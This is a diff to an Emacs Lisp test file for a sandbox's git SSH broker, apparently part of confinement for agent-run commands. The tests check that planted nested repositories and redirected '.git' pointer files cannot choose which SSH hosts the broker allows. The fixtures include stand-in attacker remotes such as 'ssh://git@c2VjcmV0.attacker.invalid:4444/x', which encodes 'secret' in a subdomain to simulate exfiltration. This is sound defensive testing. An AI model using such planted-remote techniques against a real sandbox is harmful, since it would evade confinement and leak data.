@@ -83,30 +83,89 @@ remote command locally, as sshd would, and logs each invocation to `log'."
 ;;; Broker lifecycle
 
 (mevedel-deftest mevedel-sandbox--git-ssh-urls
-  (:doc "only fetch URLs that may use SSH, after insteadOf expansion")
+  (:doc "only fetch URLs that may use SSH, after insteadOf expansion, from the named repository")
   (test-mevedel-sandbox-git-ssh--with-repositories
     (test-mevedel-sandbox-git-ssh--git work "remote" "add" "web" "https://example.com/r.git")
     (test-mevedel-sandbox-git-ssh--git work "remote" "add" "local" remote)
+    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "helper" "codecommit::us-east-1://r")
+    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "v6" "ssh://[::1]/x")
     (test-mevedel-sandbox-git-ssh--git work "config" "url.git@example.com:.insteadOf" "gh:")
     (test-mevedel-sandbox-git-ssh--git work "remote" "add" "short" "gh:org/r")
     (test-mevedel-sandbox-git-ssh--git work "remote" "set-url" "--push" "short" "pushhost:r")
-    (should (equal (list (concat "ssh://fake" remote) "git@example.com:org/r")
-                   (mevedel-sandbox--git-ssh-urls work)))
-    (should-not (mevedel-sandbox--git-ssh-urls root))))
+    ;; A nested repository is not consulted in place of the named one.
+    (make-directory (file-name-concat work "sub"))
+    (test-mevedel-sandbox-git-ssh--git (file-name-concat work "sub") "init" "-q")
+    (test-mevedel-sandbox-git-ssh--git (file-name-concat work "sub")
+                                       "remote" "add" "y" "git@attacker.invalid:x")
+    ;; Git lists remotes by name: origin, short, v6.
+    (should (equal (list (concat "ssh://fake" remote) "git@example.com:org/r"
+                         "ssh://[::1]/x")
+                   (mevedel-sandbox--git-ssh-urls
+                    "git" (file-name-concat work ".git"))))
+    (should-not (mevedel-sandbox--git-ssh-urls "git" sockets))))
+
+(mevedel-deftest mevedel-sandbox--git-ssh-git-dir ()
+  ,test
+  (test)
+  :doc "the primary root's own repository is trusted from any working subdirectory"
+  (test-mevedel-sandbox-git-ssh--with-repositories
+    (let ((roots (list (file-name-as-directory work))))
+      (make-directory (file-name-concat work "lib"))
+      (should (equal (file-name-concat work ".git")
+                     (mevedel-sandbox--git-ssh-git-dir "git" work roots)))
+      (should (equal (file-name-concat work ".git")
+                     (mevedel-sandbox--git-ssh-git-dir
+                      "git" (file-name-concat work "lib") roots)))))
+  :doc "a nested repository inside a writable root may be planted and is refused"
+  (test-mevedel-sandbox-git-ssh--with-repositories
+    (let ((sub (file-name-concat work "sub")))
+      (make-directory sub)
+      (test-mevedel-sandbox-git-ssh--git sub "init" "-q")
+      (should-not (mevedel-sandbox--git-ssh-git-dir
+                   "git" sub (list (file-name-as-directory work))))
+      ;; As its own primary root it still sits inside another work tree.
+      (should-not (mevedel-sandbox--git-ssh-git-dir
+                   "git" sub (list (file-name-as-directory sub))))))
+  :doc "a pointer into a writable root is refused; metadata outside every root is trusted"
+  (test-mevedel-sandbox-git-ssh--with-repositories
+    (let ((linked (file-name-concat root "linked"))
+          (scratch (file-name-concat root "scratch")))
+      (test-mevedel-sandbox-git-ssh--git work "commit" "-q" "--allow-empty" "-m" "base")
+      (test-mevedel-sandbox-git-ssh--git work "worktree" "add" "-q" linked)
+      ;; A linked worktree's metadata lives in the main repository, outside
+      ;; the worktree's writable root.
+      (should (string-prefix-p
+               (file-name-concat work ".git" "worktrees")
+               (mevedel-sandbox--git-ssh-git-dir
+                "git" linked (list (file-name-as-directory linked)))))
+      ;; The same metadata is refused when a writable root covers it.
+      (should-not (mevedel-sandbox--git-ssh-git-dir
+                   "git" linked (list (file-name-as-directory linked)
+                                      (file-name-as-directory work))))
+      ;; A planted pointer file aimed at another writable root is refused.
+      (make-directory scratch)
+      (test-mevedel-sandbox-git-ssh--git root "init" "-q" "--bare" "scratch/evil.git")
+      (delete-file (file-name-concat linked ".git"))
+      (with-temp-file (file-name-concat linked ".git")
+        (insert "gitdir: " (file-name-concat scratch "evil.git") "\n"))
+      (should-not (mevedel-sandbox--git-ssh-git-dir
+                   "git" linked (list (file-name-as-directory linked)
+                                      (file-name-as-directory scratch)))))))
 
 (mevedel-deftest mevedel-sandbox--git-ssh-start ()
   ,test
   (test)
   :doc "only a local command mentioning git in a repository with SSH remotes starts it"
   (test-mevedel-sandbox-git-ssh--with-repositories
-    (should-not (mevedel-sandbox--git-ssh-start '("make" "update") work))
-    (should-not (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch") root))
+    (should-not (mevedel-sandbox--git-ssh-start '("make" "update") work (list work)))
+    (should-not (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch") root (list root)))
     (should-not (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch")
-                                                "/ssh:host:/srv/work"))
+                                                "/ssh:host:/srv/work" (list work)))
     (should-not (directory-files sockets nil "\\`git-ssh-")))
   :doc "a started broker listens in an owner-only directory until stopped"
   (test-mevedel-sandbox-git-ssh--with-repositories
-    (let ((broker (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch") work)))
+    (let ((broker (mevedel-sandbox--git-ssh-start
+                   '("sh" "-c" "git fetch") work (list (file-name-as-directory work)))))
       (unwind-protect
           (let ((directory (plist-get broker :directory))
                 (deadline (+ (float-time) 10)))
@@ -158,7 +217,52 @@ remote command locally, as sshd would, and logs each invocation to `log'."
                 (delete-process client)))
             ;; Stopping twice is harmless: teardown paths may overlap.
             (mevedel-sandbox--git-ssh-stop broker))
-        (mevedel-sandbox--git-ssh-stop broker)))))
+        (mevedel-sandbox--git-ssh-stop broker))))
+  :doc "real Bubblewrap plant: a nested repository written by one confined command
+cannot choose the destinations a later command's broker allows"
+  (let ((mevedel-sandbox-mode 'required)
+        (mevedel-sandbox--probe-cache nil))
+    (skip-unless (and (eq system-type 'gnu/linux)
+                      (executable-find "git") (executable-find "python3")
+                      (plist-get (mevedel-sandbox-probe) :available)))
+    (test-mevedel-sandbox-git-ssh--with-repositories
+      (let ((sub (file-name-concat work "sub"))
+            prepared result)
+        (make-directory sub)
+        (unwind-protect
+            (progn
+              ;; Command 1, without grants: plant a repository in sub.
+              (setq prepared
+                    (mevedel-sandbox-prepare
+                     (list "sh" "-c"
+                           (concat "cd sub && git init -q . && git remote add y "
+                                   "'ssh://git@c2VjcmV0.attacker.invalid:4444/x'"))
+                     work (list work))
+                    result (test-mevedel-sandbox-git-ssh--run prepared))
+              (ert-info ((cdr result)) (should (eql 0 (car result))))
+              (should (file-directory-p (file-name-concat sub ".git")))
+              (mevedel-sandbox-cleanup prepared)
+              ;; Command 2 in sub, under the workspace root and as its own root.
+              (dolist (roots (list (list work) (list sub)))
+                (ert-info ((format "roots: %S" roots))
+                  (setq prepared (mevedel-sandbox-prepare
+                                  '("git" "ls-remote" "y") sub roots)
+                        result (test-mevedel-sandbox-git-ssh--run prepared))
+                  (should (eq 'confined (plist-get prepared :state)))
+                  (should-not (plist-get prepared :git-ssh))
+                  (should-not (eql 0 (car result)))
+                  (mevedel-sandbox-cleanup prepared)))
+              (should-not (and (file-exists-p log)
+                               (with-temp-buffer
+                                 (insert-file-contents log)
+                                 (string-search "attacker" (buffer-string)))))
+              ;; Control: the workspace's own repository still gets its broker.
+              (setq prepared (mevedel-sandbox-prepare
+                              '("git" "ls-remote" "origin") work (list work))
+                    result (test-mevedel-sandbox-git-ssh--run prepared))
+              (should (plist-get prepared :git-ssh))
+              (ert-info ((cdr result)) (should (eql 0 (car result)))))
+          (mevedel-sandbox-cleanup prepared))))))
 
 (mevedel-deftest mevedel-sandbox--git-ssh-arguments ()
   ,test
